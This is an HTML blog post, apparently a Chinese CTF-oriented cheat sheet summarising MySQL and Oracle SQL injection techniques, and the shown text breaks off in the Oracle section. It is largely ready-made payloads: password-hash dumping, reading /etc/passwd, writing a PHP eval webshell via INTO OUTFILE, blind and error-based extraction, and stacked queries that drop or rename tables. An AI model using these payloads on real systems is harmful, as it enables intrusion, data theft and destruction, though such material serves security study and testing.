@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="Lethe&#39;s Blog">
+    <meta name="author" content="Lethe">
+    <meta name="keywords" content="Lethe&#39;s Blog">
+    <title>SQL注入总结 ~ Lethe | 忘川</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>Lethe | 忘川</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/img/2.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">SQL注入总结</p>
+            <br>
+            
+            <p>星期二, 七月 16日 2019, 4:36 下午</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <p>自己的总结加上搜集网上各路大牛的方法，应该还算比较全了。<br><a href="http://p0desta.com/" target="_blank" rel="noopener">p0desta‘s Blog</a><br><br></p>
+<h2 id="一、基本知识"><a href="#一、基本知识" class="headerlink" title="一、基本知识"></a>一、基本知识</h2><h3 id="1、常用函数"><a href="#1、常用函数" class="headerlink" title="1、常用函数"></a>1、常用函数</h3><h6 id="（1）查看当前数据库版本"><a href="#（1）查看当前数据库版本" class="headerlink" title="（1）查看当前数据库版本"></a>（1）查看当前数据库版本</h6><ul>
+<li>version()</li>
+<li>@@version</li>
+<li>@@global.version</li>
+</ul>
+<h6 id="（2）查看当前登陆用户"><a href="#（2）查看当前登陆用户" class="headerlink" title="（2）查看当前登陆用户"></a>（2）查看当前登陆用户</h6><ul>
+<li>user()</li>
+<li>current_user()</li>
+<li>system_user()</li>
+<li>session_user()</li>
+</ul>
+<h6 id="（3）当前使用的数据库"><a href="#（3）当前使用的数据库" class="headerlink" title="（3）当前使用的数据库"></a>（3）当前使用的数据库</h6><ul>
+<li>database()</li>
+<li>schema()</li>
+</ul>
+<h6 id="（4）路径查询"><a href="#（4）路径查询" class="headerlink" title="（4）路径查询"></a>（4）路径查询</h6><ul>
+<li>@@basedir ——mysql安装路径 </li>
+<li>@@slave_load_tampdir ——临时文件夹路径</li>
+<li>@@datadir ——数据存储路径</li>
+<li>@@character_sets_dir ——字符集设置文件路径</li>
+<li>@@log_error ——错误日志文件路径</li>
+<li>@@pid_file ——pid-file文件路径</li>
+</ul>
+<h6 id="（5）字符串连接函数"><a href="#（5）字符串连接函数" class="headerlink" title="（5）字符串连接函数"></a>（5）字符串连接函数</h6><ul>
+<li>group_concat() ——返回一个字符串结果，该结果由分组中的值连接组合而成。<code>group_concat([DISTINCT] 要连接的字段[Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></li>
+<li>concat() ——将多个字符串连接成一个字符串，<code>CONCAT(str1,str2,…)</code></li>
+<li>concat_ws() ——有分隔符的字符串连接,<code>CONCAT_WS(separator,str1,str2,…)</code></li>
+</ul>
+<h6 id="（6）盲注常用函数"><a href="#（6）盲注常用函数" class="headerlink" title="（6）盲注常用函数"></a>（6）盲注常用函数</h6><ul>
+<li>length(str) ——返回字符串str的长度</li>
+<li>mid(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
+<li>substr(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
+<li>left(str, length) ——返回具有指定长度的字符串的左边部分</li>
+<li>ord()  ——返回字符串第一个字符的 ASCII 值</li>
+<li>ascii() ——返回字符串第一个字符的 ASCII 值</li>
+</ul>
+<h6 id="（7）Time-Based常用函数"><a href="#（7）Time-Based常用函数" class="headerlink" title="（7）Time-Based常用函数"></a>（7）Time-Based常用函数</h6><ul>
+<li>BENCHMARK(count,expr)   ——重复count次执行表达式expr</li>
+<li>sleep(n) ——暂停数据库n秒</li>
+<li>if(expr1,expr2,expr3) ——如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值</li>
+</ul>
+<h6 id="（8）Wrong-Based常用函数"><a href="#（8）Wrong-Based常用函数" class="headerlink" title="（8）Wrong-Based常用函数"></a>（8）Wrong-Based常用函数</h6><ul>
+<li>rand(int) ——以int为种子生成伪随机数</li>
+<li>floor() ——返回小于等于该值的最大整数</li>
+<li>count() ——统计个数</li>
+<li>updatexml()</li>
+</ul>
+<blockquote>
+<p><strong>updatexml()函数</strong><br><br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据  <br><br> <strong>作用</strong>： 改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
+</blockquote>
+<p>例如，<code>updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);</code><br>由于<code>updatexml()</code>的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，其中的<code>concat()</code>函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<h6 id="（9）其他函数"><a href="#（9）其他函数" class="headerlink" title="（9）其他函数"></a>（9）其他函数</h6><ul>
+<li>bin() ——返回值的二进制表示</li>
+<li>conv(str,m,n) ——进制转换，将str从m进制转换为n进制</li>
+<li>lower() ——转成小写字母</li>
+<li>upper() ——转成大写字母</li>
+<li>hex() ——十六进制编码</li>
+<li>unhex() ——十六进制解码</li>
+</ul>
+<p><br></p>
+<h3 id="2、常用语句及方法"><a href="#2、常用语句及方法" class="headerlink" title="2、常用语句及方法"></a>2、常用语句及方法</h3><h5 id="（1）Mysql常用语句"><a href="#（1）Mysql常用语句" class="headerlink" title="（1）Mysql常用语句"></a>（1）Mysql常用语句</h5><h6 id="所有用户："><a href="#所有用户：" class="headerlink" title="所有用户："></a>所有用户：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(user) from mysql.user</span><br></pre></td></tr></table></figure>
+<h6 id="用户hash："><a href="#用户hash：" class="headerlink" title="用户hash："></a>用户hash：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(password) from mysql.user where user=&apos;root&apos;</span><br></pre></td></tr></table></figure>
+<h6 id="所有数据库："><a href="#所有数据库：" class="headerlink" title="所有数据库："></a>所有数据库：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+<h6 id="表名："><a href="#表名：" class="headerlink" title="表名："></a>表名：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(table_name) from information_schema.tables where table_schema=&apos;库名&apos;</span><br></pre></td></tr></table></figure>
+<h6 id="表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出"><a href="#表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出" class="headerlink" title="//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出"></a>//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=&apos;库名&apos;</span><br></pre></td></tr></table></figure>
+<h6 id="字段名："><a href="#字段名：" class="headerlink" title="字段名："></a>字段名：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;</span><br></pre></td></tr></table></figure>
+<h6 id="读文件："><a href="#读文件：" class="headerlink" title="读文件："></a>读文件：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>
+<h6 id="写文件："><a href="#写文件：" class="headerlink" title="写文件："></a>写文件：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h5 id="（2）UNION注入"><a href="#（2）UNION注入" class="headerlink" title="（2）UNION注入"></a>（2）UNION注入</h5><h6 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; order by 1 %23</span><br><span class="line">id=1&apos; order by 2 %23</span><br><span class="line">id=1&apos; order by 3 %23</span><br><span class="line">·····</span><br><span class="line">id=1&apos; order by n %23</span><br><span class="line"></span><br><span class="line">直到报错为止，最后一个页面正确回显的数，即为列数</span><br></pre></td></tr></table></figure>
+<h6 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=-1&apos; UNION SELECT 1,2 %23</span><br></pre></td></tr></table></figure>
+<p>然后在可回显的位置处构造SQL语句进行注入<br><br></p>
+<h5 id="（2）报错注入"><a href="#（2）报错注入" class="headerlink" title="（2）报错注入"></a>（2）报错注入</h5><h6 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>
+<h6 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+<h6 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<h6 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
+<h6 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
+<h6 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where username=&quot;&quot;and polygon (password);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`password`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h5 id="（3）bool盲注"><a href="#（3）bool盲注" class="headerlink" title="（3）bool盲注"></a>（3）bool盲注</h5><p>对于盲注，常常需要写脚本来进行注入<br>可参考：<a href="https://lethe.site/2019/03/02/%E4%BB%A5dvwa%E4%B8%BA%E4%BE%8B%E5%AD%A6%E4%B9%A0%E7%AE%80%E5%8D%95sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%AF%A6%E7%BB%86%E8%84%9A%E6%9C%AC/">以dvwa为例简单bool盲注脚本</a><br>payload：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</span><br><span class="line">// k ，结合limit，选择偏移为k的行</span><br><span class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</span><br><span class="line">// SUBSTR() 也可以换成 SUBSTRING()</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</span><br><span class="line"></span><br><span class="line">&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </span><br><span class="line"></span><br><span class="line">&apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<h5 id="（4）时间盲注"><a href="#（4）时间盲注" class="headerlink" title="（4）时间盲注"></a>（4）时间盲注</h5><h6 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1&apos; OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">&apos;) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">SELECT SLEEP(25) #</span><br></pre></td></tr></table></figure>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line"></span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h5 id="（5）Insert-Update注入"><a href="#（5）Insert-Update注入" class="headerlink" title="（5）Insert / Update注入"></a>（5）Insert / Update注入</h5><p>insert和update一般使用报错注入，如果没有错误回显，insert可以使用延时注入，update可以使用bool盲注和延时盲注。</p>
+<p>如果存在<code>insert</code>或者<code>update</code>，更新后的数据是可见的话,那么利用mysql的隐式类型转换，其实就是当字符串与整数相加时，会当作整数来解释，如下：<br><img src="/2019/07/16/SQL注入总结/1.png" alt="在这里插入图片描述"></p>
+<p>那么我们可以利用查询的数据转化为<strong>10进制</strong>,然后进行运算,拿到我们计算的结果,在进行转化回去即可。<br>（可参考RCTF 2015 upload一题）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set password=&apos;&apos;+conv(hex(substr(user(),1 + (1-1) * 8, 6)), 16, 10);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">| id | username | password        |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">|  1 | admin    | 125822936825964 |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(conv(125822936825964, 10 ,16));</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| unhex(conv(125822936825964, 10 ,16)) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| root@l                               |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<h5 id="（6）表名可控注入"><a href="#（6）表名可控注入" class="headerlink" title="（6）表名可控注入"></a>（6）表名可控注入</h5><h6 id="表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/16/SQL注入总结/2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure></p>
+<h6 id="表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc shop_&#123;$table&#125;"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from `shop_&#123;$table&#125;` where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/16/SQL注入总结/3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
+<h5 id="（7）无列名注入"><a href="#（7）无列名注入" class="headerlink" title="（7）无列名注入"></a>（7）无列名注入</h5><h6 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/16/SQL注入总结/4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 as c union select * from flag) as b) limit 1,1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/16/SQL注入总结/5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h6 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from flag)x;</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h5 id="（8）可报错时爆表名、字段名、库名"><a href="#（8）可报错时爆表名、字段名、库名" class="headerlink" title="（8）可报错时爆表名、字段名、库名"></a>（8）可报错时爆表名、字段名、库名</h5><h6 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h6><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from admin where id=1 and (select * from (select * from admin as a join admin as b) as c)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/16/SQL注入总结/6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把当前表第一个字段成功爆出来了。</p>
+<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
+<p>同时，可以利用using爆其他字段：<br><img src="/2019/07/16/SQL注入总结/7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h6 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h6><p>翻阅mysql的文档发现了一个非常好玩的函数</p>
+<p>Polygon(ls1, ls2, …)</p>
+<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
+<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="/2019/07/16/SQL注入总结/8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h6 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h6><p>上面的方法已经可以爆出库名了，提供另一个方法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1-a()</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<h5 id="（9）堆叠注入"><a href="#（9）堆叠注入" class="headerlink" title="（9）堆叠注入"></a>（9）堆叠注入</h5><h6 id="新建一个表"><a href="#新建一个表" class="headerlink" title="新建一个表"></a>新建一个表</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+<h6 id="删除上面新建的test表"><a href="#删除上面新建的test表" class="headerlink" title="删除上面新建的test表"></a>删除上面新建的test表</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+<h6 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
+<h6 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1;select load_file(&apos;c:/tmpupbbn.php&apos;);</span><br></pre></td></tr></table></figure>
+<h6 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1;insert into users(id,username,password)</span><br><span class="line">values(&apos;100&apos;,&apos;new&apos;,&apos;new&apos;);</span><br></pre></td></tr></table></figure>
+<h6 id="找一处可查询处-利用修改表名来拿数据"><a href="#找一处可查询处-利用修改表名来拿数据" class="headerlink" title="找一处可查询处,利用修改表名来拿数据"></a>找一处可查询处,利用修改表名来拿数据</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;;rename table `words` to `xxxx`;rename table `1919810931114514` to `words`;alter table `words` add id int primary key auto_increment;%23</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h2 id="三、其他数据库"><a href="#三、其他数据库" class="headerlink" title="三、其他数据库"></a>三、其他数据库</h2><h3 id="1-Oracle"><a href="#1-Oracle" class="headerlink" title="1.Oracle"></a>1.Oracle</h3><h6 id="注释符："><a href="#注释符：" class="headerlink" title="注释符："></a>注释符：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- +</span><br></pre></td></tr></table></figure>
+<h6 id="当前用户权限："><a href="#当前用户权限：" class="headerlink" title="当前用户权限："></a>当前用户权限：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from session_roles</span><br></pre></td></tr></table></figure>
+<h6 id="当前数据库版本："><a href="#当前数据库版本：" class="headerlink" title="当前数据库版本："></a>当前数据库版本：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select banner from sys.v_$version where rownum=1</span><br></pre></td></tr></table></figure>
+<h6 id="服务器监听IP："><a href="#服务器监听IP：" class="headerlink" title="服务器监听IP："></a>服务器监听IP：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_address from dual</span><br></pre></td></tr></table></figure>
+<h6 id="服务器操作系统："><a href="#服务器操作系统：" class="headerlink" title="服务器操作系统："></a>服务器操作系统：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select member from v$logfile where rownum=1</span><br></pre></td></tr></table></figure>
+<h6 id="服务器sid："><a href="#服务器sid：" class="headerlink" title="服务器sid："></a>服务器sid：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select instance_name fromv$instance</span><br></pre></td></tr></table></figure>
+<h6 id="当前连接用户："><a href="#当前连接用户：" class="headerlink" title="当前连接用户："></a>当前连接用户：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS_CONTEXT (&apos;USERENV&apos;, &apos;CURRENT_USER&apos;)from dual</span><br></pre></td></tr></table></figure>
+<h6 id="获取数据库名："><a href="#获取数据库名：" class="headerlink" title="获取数据库名："></a>获取数据库名：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select owner from all_tables where rownum=1</span><br><span class="line">依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库select owner from all_tables where rownum=1 and owner&lt;&gt;&apos;first_dbname&apos;依次类推</span><br></pre></td></tr></table></figure>
